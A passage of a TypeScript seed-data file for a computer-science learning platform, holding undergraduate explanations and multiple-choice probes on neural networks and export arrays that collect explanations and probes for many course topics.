    ], correctValue: 'No — global distances not preserved', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${UNSUPLEARN}:M1`], source: UNSUPLEARN_SRC },
]

const NEURALNET = 'cs.ds.neural-networks-intro'
const NEURALNET_SRC = 'docs/computer-science/kg/graph.json — cs.ds.neural-networks-intro'
const NEURALNET_EXPLANATIONS: SeedExplanation[] = [
  { conceptId: NEURALNET, subjectSlug: 'computer_science', familyKind: 'core_explanation', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'A neural network is a layered computation graph of neurons. Each neuron computes a weighted sum of inputs plus a bias, then applies a non-linear activation (ReLU: max(0,x); Sigmoid: 1/(1+e^-x); Softmax: for multi-class output). A network with at least one hidden layer is "deep." Training: forward pass (compute predictions) → compute loss (e.g., cross-entropy) → backward pass via backpropagation (chain rule gradients) → gradient descent (w ← w - η·∂L/∂w). Hyperparameters: layers, neurons, learning rate, batch size, epochs. Regularisation (dropout, L2) prevents overfitting.',
    targetedMisconceptions: [`${NEURALNET}:M1`], source: NEURALNET_SRC },
  { conceptId: NEURALNET, subjectSlug: 'computer_science', familyKind: 'misconception_repair', gradeBand: GradeBand.UNDERGRADUATE,
    content: 'Misconception: "Neural networks work like the human brain." They are loosely inspired by neurons but are mathematical functions — weight matrices multiplied by vectors, not biological computation. The analogy breaks down immediately at the biological level. Another error: "More layers always give better results." Very deep networks without residual connections suffer from vanishing gradients — early layers receive near-zero gradient signals and fail to train. Third: "Low training loss guarantees good generalisation." Overfitting can achieve near-zero training loss while failing on unseen data.',
    targetedMisconceptions: [`${NEURALNET}:M1`], source: NEURALNET_SRC },
]
const NEURALNET_PROBES: SeedProbe[] = [
  { conceptId: NEURALNET, subjectSlug: 'computer_science', probeKind: 'mcq', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'What does backpropagation compute during neural network training?',
    choices: [
      { text: 'Gradients of the loss with respect to each weight, used by gradient descent', isCorrect: true },
      { text: 'The network\'s predictions on the test set', isCorrect: false },
      { text: 'The optimal number of hidden layers', isCorrect: false },
      { text: 'The activation of each neuron during inference', isCorrect: false },
    ], correctValue: 'Gradients of loss w.r.t. weights', difficulty: ProbeDifficulty.PROFICIENT, targetedMisconceptions: [], source: NEURALNET_SRC },
  { conceptId: NEURALNET, subjectSlug: 'computer_science', probeKind: 'misconception_probe', gradeBand: GradeBand.UNDERGRADUATE,
    stem: 'Does adding more hidden layers always improve a neural network\'s performance?',
    choices: [
      { text: 'No — very deep networks without residual connections can suffer from vanishing gradients', isCorrect: true },
      { text: 'Yes — deeper networks are universally better', isCorrect: false, misconceptionId: `${NEURALNET}:M1` },
      { text: 'Yes, if the learning rate is reduced proportionally', isCorrect: false },
      { text: 'No — more layers always cause overfitting regardless of regularisation', isCorrect: false },
    ], correctValue: 'No — vanishing gradients', difficulty: ProbeDifficulty.ADVANCED, targetedMisconceptions: [`${NEURALNET}:M1`], source: NEURALNET_SRC },
]
// ─── Batch export ──────────────────────────────────────────────────────────────
export const CS_EXPLANATIONS: SeedExplanation[] = [
  ...CSFOUND_EXPLANATIONS,
  ...COMPORG_EXPLANATIONS,
  ...NUMSYS_EXPLANATIONS,
  ...BOOLLOG_EXPLANATIONS,
  ...MEMSTG_EXPLANATIONS,
  ...CPUARCH_EXPLANATIONS,
  ...PIPELCACHE_EXPLANATIONS,
  ...SWCONCEPT_EXPLANATIONS,
  ...OSCONCEPT_EXPLANATIONS,
  ...PROBSOLV_EXPLANATIONS,
  ...ALGO_EXPLANATIONS,
  ...FLOWCHRT_EXPLANATIONS,
  ...ASYMP_EXPLANATIONS,
  ...TIMECPLX_EXPLANATIONS,
  ...DIVCONQ_EXPLANATIONS,
  ...GREEDY_EXPLANATIONS,
  ...DYNPROG_EXPLANATIONS,
  ...BKTRACK_EXPLANATIONS,
  ...NPCOMP_EXPLANATIONS,
  ...INTROPROG_EXPLANATIONS,
  ...PYBASIC_EXPLANATIONS,
  ...DTYPES_EXPLANATIONS,
  ...OPEXPR_EXPLANATIONS,
  ...TYPECONV_EXPLANATIONS,
  ...CSIO_EXPLANATIONS,
  ...EXCHAND_EXPLANATIONS,
  ...COND_EXPLANATIONS,
  ...LOOPS_EXPLANATIONS,
  ...NESTED_EXPLANATIONS,
  ...CSSTRS_EXPLANATIONS,
  ...CSLISTS_EXPLANATIONS,
  ...TUPLES_EXPLANATIONS,
  ...DICTS_EXPLANATIONS,
  ...CSSETS_EXPLANATIONS,
  ...COMPITER_EXPLANATIONS,
  ...FUNCS_EXPLANATIONS,
  ...SCOPE_EXPLANATIONS,
  ...RECUR_EXPLANATIONS,
  ...LAMBDA_EXPLANATIONS,
  ...MODPKG_EXPLANATIONS,
  ...DECOR_EXPLANATIONS,
  // batch 3: cs.file + cs.struct
  ...TXTFILE_EXPLANATIONS,
  ...CSVFILE_EXPLANATIONS,
  ...BINSERIAL_EXPLANATIONS,
  ...STACKS_EXPLANATIONS,
  ...QUEUES_EXPLANATIONS,
  ...DEQUES_EXPLANATIONS,
  ...LINKEDLIST_EXPLANATIONS,
  ...DBLLIST_EXPLANATIONS,
  ...CSTREES_EXPLANATIONS,
  ...BSTREE_EXPLANATIONS,
  ...BALTREE_EXPLANATIONS,
  ...CSHEAPS_EXPLANATIONS,
  ...HASHTBL_EXPLANATIONS,
  ...GRAPHREP_EXPLANATIONS,
  ...GRAPHTRAV_EXPLANATIONS,
  ...SHORTPATH_EXPLANATIONS,
  ...MSTTREE_EXPLANATIONS,
  ...LINSER_EXPLANATIONS,
  ...BINSEARCH_EXPLANATIONS,
  ...ELEMSORT_EXPLANATIONS,
  ...EFFSORT_EXPLANATIONS,
  // batch 4: cs.oop + cs.db
  ...OOPCONCEPT_EXPLANATIONS,
  ...CLSOBJS_EXPLANATIONS,
  ...ENCABSTR_EXPLANATIONS,
  ...INHERIT_EXPLANATIONS,
  ...POLYMORPH_EXPLANATIONS,
  ...CLSSTAT_EXPLANATIONS,
  ...DESPAT_EXPLANATIONS,
  ...DBCONCEPT_EXPLANATIONS,
  ...ERMODEL_EXPLANATIONS,
  ...RELMODEL_EXPLANATIONS,
  ...NORMAL_EXPLANATIONS,
  ...SQLDML_EXPLANATIONS,
  ...SQLQRY_EXPLANATIONS,
  ...SQLJOIN_EXPLANATIONS,
  ...ACIDTX_EXPLANATIONS,
  ...DBIDX_EXPLANATIONS,
  ...NOSQL_EXPLANATIONS,
  ...MYSQLPY_EXPLANATIONS,
  // batch 5: cs.os + cs.net + cs.sec + cs.web
  ...PROCMGMT_EXPLANATIONS,
  ...THREADSCONC_EXPLANATIONS,
  ...CPUSCHED_EXPLANATIONS,
  ...SYNCDEAD_EXPLANATIONS,
  ...MEMMGMT_EXPLANATIONS,
  ...VIRTMEM_EXPLANATIONS,
  ...FILESYS_EXPLANATIONS,
  ...NETBASICS_EXPLANATIONS,
  ...OSITCPIP_EXPLANATIONS,
  ...IPADDRSS_EXPLANATIONS,
  ...DNSDHCP_EXPLANATIONS,
  ...APPPROTO_EXPLANATIONS,
  ...TCPUDP_EXPLANATIONS,
  ...ROUTCONG_EXPLANATIONS,
  ...WIRENET_EXPLANATIONS,
  ...CLOUD_EXPLANATIONS,
  ...CYBERETH_EXPLANATIONS,
  ...CRYPTOBAS_EXPLANATIONS,
  ...NETSEC_EXPLANATIONS,
  ...DATAPROT_EXPLANATIONS,
  ...CLISRV_EXPLANATIONS,
  ...HTMLCSS_EXPLANATIONS,
  ...RESTAPI_EXPLANATIONS,
  // batch 6: cs.theory + cs.se + cs.ds
  ...FINAUTO_EXPLANATIONS,
  ...REGEX_EXPLANATIONS,
  ...CFG_EXPLANATIONS,
  ...TURING_EXPLANATIONS,
  ...CPLXCLS_EXPLANATIONS,
  ...SDLC_EXPLANATIONS,
  ...VCSGIT_EXPLANATIONS,
  ...SWTEST_EXPLANATIONS,
  ...AGILEDESIGN_EXPLANATIONS,
  ...NPARRAYS_EXPLANATIONS,
  ...PANDADF_EXPLANATIONS,
  ...DATAVIZ_EXPLANATIONS,
  ...INTROML_EXPLANATIONS,
  ...SUPLEARN_EXPLANATIONS,
  ...UNSUPLEARN_EXPLANATIONS,
  ...NEURALNET_EXPLANATIONS,
]
export const CS_PROBES: SeedProbe[] = [
  ...CSFOUND_PROBES,
  ...COMPORG_PROBES,
  ...NUMSYS_PROBES,
  ...BOOLLOG_PROBES,
  ...MEMSTG_PROBES,
  ...CPUARCH_PROBES,
  ...PIPELCACHE_PROBES,
  ...SWCONCEPT_PROBES,
  ...OSCONCEPT_PROBES,
  ...PROBSOLV_PROBES,
  ...ALGO_PROBES,
  ...FLOWCHRT_PROBES,
  ...ASYMP_PROBES,
  ...TIMECPLX_PROBES,
  ...DIVCONQ_PROBES,
  ...GREEDY_PROBES,
  ...DYNPROG_PROBES,
  ...BKTRACK_PROBES,
  ...NPCOMP_PROBES,
  ...INTROPROG_PROBES,
  ...PYBASIC_PROBES,
  ...DTYPES_PROBES,
  ...OPEXPR_PROBES,
  ...TYPECONV_PROBES,
  ...CSIO_PROBES,
  ...EXCHAND_PROBES,
  ...COND_PROBES,
  ...LOOPS_PROBES,
  ...NESTED_PROBES,
  ...CSSTRS_PROBES,
  ...CSLISTS_PROBES,
  ...TUPLES_PROBES,
  ...DICTS_PROBES,
  ...CSSETS_PROBES,
  ...COMPITER_PROBES,
  ...FUNCS_PROBES,
  ...SCOPE_PROBES,
  ...RECUR_PROBES,
  ...LAMBDA_PROBES,
  ...MODPKG_PROBES,
  ...DECOR_PROBES,
  // batch 3: cs.file + cs.struct
  ...TXTFILE_PROBES,
  ...CSVFILE_PROBES,
  ...BINSERIAL_PROBES,
  ...STACKS_PROBES,
  ...QUEUES_PROBES,
  ...DEQUES_PROBES,
  ...LINKEDLIST_PROBES,
  ...DBLLIST_PROBES,
  ...CSTREES_PROBES,
  ...BSTREE_PROBES,
  ...BALTREE_PROBES,
  ...CSHEAPS_PROBES,
  ...HASHTBL_PROBES,
  ...GRAPHREP_PROBES,
  ...GRAPHTRAV_PROBES,
  ...SHORTPATH_PROBES,
  ...MSTTREE_PROBES,
  ...LINSER_PROBES,
  ...BINSEARCH_PROBES,
  ...ELEMSORT_PROBES,
  ...EFFSORT_PROBES,
  // batch 4: cs.oop + cs.db
  ...OOPCONCEPT_PROBES,
  ...CLSOBJS_PROBES,
  ...ENCABSTR_PROBES,
  ...INHERIT_PROBES,
  ...POLYMORPH_PROBES,
  ...CLSSTAT_PROBES,
  ...DESPAT_PROBES,
  ...DBCONCEPT_PROBES,
  ...ERMODEL_PROBES,
  ...RELMODEL_PROBES,
  ...NORMAL_PROBES,
  ...SQLDML_PROBES,
  ...SQLQRY_PROBES,
  ...SQLJOIN_PROBES,
  ...ACIDTX_PROBES,
  ...DBIDX_PROBES,
  ...NOSQL_PROBES,
  ...MYSQLPY_PROBES,
  // batch 5: cs.os + cs.net + cs.sec + cs.web
  ...PROCMGMT_PROBES,
  ...THREADSCONC_PROBES,
  ...CPUSCHED_PROBES,
  ...SYNCDEAD_PROBES,
  ...MEMMGMT_PROBES,
  ...VIRTMEM_PROBES,
  ...FILESYS_PROBES,
  ...NETBASICS_PROBES,
  ...OSITCPIP_PROBES,
  ...IPADDRSS_PROBES,
  ...DNSDHCP_PROBES,
  ...APPPROTO_PROBES,
  ...TCPUDP_PROBES,
  ...ROUTCONG_PROBES,
  ...WIRENET_PROBES,
  ...CLOUD_PROBES,
  ...CYBERETH_PROBES,
  ...CRYPTOBAS_PROBES,
  ...NETSEC_PROBES,
  ...DATAPROT_PROBES,
  ...CLISRV_PROBES,
  ...HTMLCSS_PROBES,
  ...RESTAPI_PROBES,
  // batch 6: cs.theory + cs.se + cs.ds
  ...FINAUTO_PROBES,
  ...REGEX_PROBES,
  ...CFG_PROBES,
  ...TURING_PROBES,
  ...CPLXCLS_PROBES,
  ...SDLC_PROBES,
  ...VCSGIT_PROBES,
  ...SWTEST_PROBES,
  ...AGILEDESIGN_PROBES,
  ...NPARRAYS_PROBES,
  ...PANDADF_PROBES,
  ...DATAVIZ_PROBES,
  ...INTROML_PROBES,
  ...SUPLEARN_PROBES,
  ...UNSUPLEARN_PROBES,
  ...NEURALNET_PROBES,
]
